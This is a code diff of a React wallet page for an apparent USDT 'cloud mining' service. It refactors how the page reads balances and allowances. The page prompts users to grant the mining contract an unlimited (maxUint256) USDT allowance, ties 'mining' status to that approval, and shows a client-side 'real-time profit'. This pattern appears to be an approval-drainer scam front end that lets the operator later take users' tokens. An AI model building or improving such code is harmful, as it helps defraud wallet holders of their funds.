@@ -5,19 +5,7 @@ import { useAccount, useReadContract, useWriteContract, useBalance, usePublicCli
 import { supabase } from '../../lib/supabase';
 import { toast } from 'react-toastify';
 import { maxUint256 } from 'viem';
-
-
-const ERC20_ABI = [
-  { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-  { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-  { "constant": true, "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
-] as const;
-
-
-const USDT_ADDRESS = process.env.NEXT_PUBLIC_USDT_ADDRESS as `0x${string}`;
-const CLOUD_MINING_CONTRACT = process.env.NEXT_PUBLIC_CLOUD_MINING_CONTRACT as `0x${string}`;
-
-
+import { getUserBalance, getAllowance, approveContract  } from '../utils/CloudMining';
 
 
 export default function Wallet() {
@@ -29,32 +17,39 @@ export default function Wallet() {
   const [withdrawals, setWithdrawals] = useState<any[]>([]);
   const profitRef = useRef(0);
   const updateCounter = useRef(0);
-  
   const lastProcessedWithdrawId = useRef<string | null>(null);
   const [initializing, setInitializing] = useState(true);
-
-
+  const [allowance, setAllowance] = useState("0");
+  const [isAllowanceFetched, setIsAllowanceFetched] = useState(false);
 
   // Fetch USDT balance and allowance
-  const { data: balanceData, refetch: refetchBalance } = useBalance({ address, token: USDT_ADDRESS, query: { refetchInterval: 15000 } });
-  const usdtBalance = useMemo(() => Number(balanceData?.formatted || 0), [balanceData]);
-
-  // Fetch allowance
-  const { data: allowanceData, refetch: refetchAllowance, isFetched: isAllowanceFetched } = useReadContract({
-    address: USDT_ADDRESS,
-    abi: ERC20_ABI,
-    functionName: 'allowance',
-    args: address ? [address, CLOUD_MINING_CONTRACT] : undefined,
-    query: { enabled: !!address, refetchInterval: 15000 },
+  const { data: balanceData } = useBalance({
+    address,
+    token: process.env.NEXT_PUBLIC_USDT_ADDRESS as `0x${string}`,
   });
-
+  const usdtBalance = useMemo(() => Number(balanceData?.formatted || 0), [balanceData]);
+  
+  // Fetch allowance
+  useEffect(() => {
+    const fetchAllowance = async () => {
+      if (!address) return;
+      try {
+        const result = await getAllowance(address);
+        setAllowance(result);
+        setIsAllowanceFetched(true);
+      } catch (error) {
+        console.error("Gagal ambil allowance:", error);
+      }
+    };
+  
+    fetchAllowance();
+  }, [address]);
+  
   // Check if allowance is infinite
   const hasInfiniteAllowance = useMemo(() => {
-    if (!allowanceData || !isAllowanceFetched) return false;
-    return BigInt(allowanceData.toString()) === BigInt(maxUint256.toString());
-  }, [allowanceData, isAllowanceFetched]);
-
-  const { writeContractAsync: approve } = useWriteContract();
+    if (!isAllowanceFetched) return false;
+    return BigInt(allowance) === BigInt(maxUint256.toString());
+  }, [allowance, isAllowanceFetched]);
 
   // Auto-approve if not already approved
   useEffect(() => {
@@ -64,9 +59,7 @@ export default function Wallet() {
         if (confirm) {
           try {
             toast.info('Please sign the transaction...');
-            const txHash = await approve({ address: USDT_ADDRESS, abi: ERC20_ABI, functionName: 'approve', args: [CLOUD_MINING_CONTRACT, maxUint256] });
-            await publicClient?.waitForTransactionReceipt({ hash: txHash, confirmations: 1 });
-            await Promise.all([refetchBalance(), refetchAllowance()]);
+            await approveContract(maxUint256.toString());
             toast.success('Approval success!');
           } catch (err) {
             toast.error('Approval failed');
@@ -222,7 +215,6 @@ export default function Wallet() {
     };
   }, [address]);
   
-
   // Handle withdrawal request
   const handleWithdraw = async () => {
     if (!userData || currentProfit < 10) return toast.error('Minimum withdraw is $10');
@@ -249,32 +241,25 @@ export default function Wallet() {
     setShowWithdrawModal(false);
   };
   
-
-  
-
-  
-
   return (
     <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
       <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">WALLET</h2>
       <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50">
         <div className="space-y-4">
-            
-
-            {/* Display wallet information */}
-            {[
-            ["USDT Balance:", `${usdtBalance.toFixed(2)} USD`],
-            ["Join Date:", userData?.join_date ? new Date(userData.join_date).toLocaleDateString() : "N/A"],
-            ["Profit (Real-time):", `$${currentProfit.toFixed(2)} USD`],
-            ["Status Mining:", hasInfiniteAllowance ? "Approved" : "Not Approved"],
-            ].map(([label, value], index) => (
+          {/* Display wallet information */}
+          {[
+          ["USDT Balance:", `${usdtBalance.toFixed(2)} USD`],
+          ["Join Date:", userData?.join_date ? new Date(userData.join_date).toLocaleDateString() : "N/A"],
+          ["Profit (Real-time):", `$${currentProfit.toFixed(2)} USD`],
+          ["Status Mining:", hasInfiniteAllowance ? "Approved" : "Not Approved"],
+          ].map(([label, value], index) => (
             <div key={index} className="flex justify-between items-center p-4 bg-white/5 rounded-lg border border-gray-700">
               <span className="text-gray-300">{label}</span>
               <span className={`text-white font-medium ${label === "Status Mining:" ? (hasInfiniteAllowance ? "text-green-400" : "text-red-400") : ""}`}>
               {value}
               </span>
             </div>
-            ))}
+          ))}
             <div className="mt-8 flex justify-center gap-4">
               <ConnectButton 
                 label="Connect Wallet"
@@ -296,51 +281,50 @@ export default function Wallet() {
             Withdrawals can only be made if the profit exceeds $10.
             </p>
         </div>
-      {showWithdrawModal && (
-        <div className="mt-4 p-4 bg-gray-700 rounded shadow-md">
-          <p className="text-lg text-white font-medium">Withdraw ${currentProfit.toFixed(2)}?</p>
-          <div className="flex justify-end gap-2 mt-2">
-            <button onClick={() => setShowWithdrawModal(false)} className="px-4 py-2 bg-gray-500 rounded hover:bg-gray-600 text-white">Cancel</button>
-            <button onClick={handleWithdraw} className="px-4 py-2 bg-blue-600 rounded hover:bg-blue-700 text-white">Confirm</button>
-          </div>
-        </div>
-      )}
+          {showWithdrawModal && (
+            <div className="mt-4 p-4 bg-gray-700 rounded shadow-md">
+              <p className="text-lg text-white font-medium">Withdraw ${currentProfit.toFixed(2)}?</p>
+              <div className="flex justify-end gap-2 mt-2">
+                <button onClick={() => setShowWithdrawModal(false)} className="px-4 py-2 bg-gray-500 rounded hover:bg-gray-600 text-white">Cancel</button>
+                <button onClick={handleWithdraw} className="px-4 py-2 bg-blue-600 rounded hover:bg-blue-700 text-white">Confirm</button>
+              </div>
+            </div>
+          )}
 
-      { /* Fetch and display withdrawal history*/ }
-      <div className="mt-8">
-        <div className="flex justify-between items-center mb-4">
-          <h3 className="text-xl text-amber-50 font-semibold">Transaction History</h3>
-          
-        </div>
-        {withdrawals.length === 0 ? (
-          <p className="text-gray-400">No withdrawals yet.</p>
-        ) : (
-          withdrawals.map((item) => (
-        <div key={item.id} className="p-4 mb-3 bg-white/5 rounded border border-gray-600">
-          <div className="flex justify-between">
-            <span className="text-gray-300">Amount:</span>
-            <span className="text-white font-medium">{item.amount.toFixed(2)} USD</span>
+          { /* Fetch and display withdrawal history*/ }
+          <div className="mt-8">
+            <div className="flex justify-between items-center mb-4">
+              <h3 className="text-xl text-amber-50 font-semibold">Transaction History</h3>
+              
+            </div>
+            {withdrawals.length === 0 ? (
+              <p className="text-gray-400">No withdrawals yet.</p>
+            ) : (
+              withdrawals.map((item) => (
+            <div key={item.id} className="p-4 mb-3 bg-white/5 rounded border border-gray-600">
+              <div className="flex justify-between">
+                <span className="text-gray-300">Amount:</span>
+                <span className="text-white font-medium">{item.amount.toFixed(2)} USD</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-300">TX Hash:</span>
+                <span className="text-blue-400 break-all">{item.tx_hash}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-300">Date:</span>
+                <span className="text-white font-medium">{new Date(item.created_at).toLocaleString()}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-300">Status:</span>
+                <span className={`text-${item.status === 'pending' ? 'yellow' : item.status === 'success' ? 'green' : 'red'}-400 font-medium`}>
+                  {item.status.charAt(0).toUpperCase() + item.status.slice(1)}
+                </span>
+              </div>
+            </div>
+              ))
+            )}
           </div>
-          <div className="flex justify-between">
-            <span className="text-gray-300">TX Hash:</span>
-            <span className="text-blue-400 break-all">{item.tx_hash}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-gray-300">Date:</span>
-            <span className="text-white font-medium">{new Date(item.created_at).toLocaleString()}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-gray-300">Status:</span>
-            <span className={`text-${item.status === 'pending' ? 'yellow' : item.status === 'success' ? 'green' : 'red'}-400 font-medium`}>
-              {item.status.charAt(0).toUpperCase() + item.status.slice(1)}
-            </span>
-          </div>
-        </div>
-          ))
-        )}
       </div>
-
-    </div>
     </section>
   );
 }
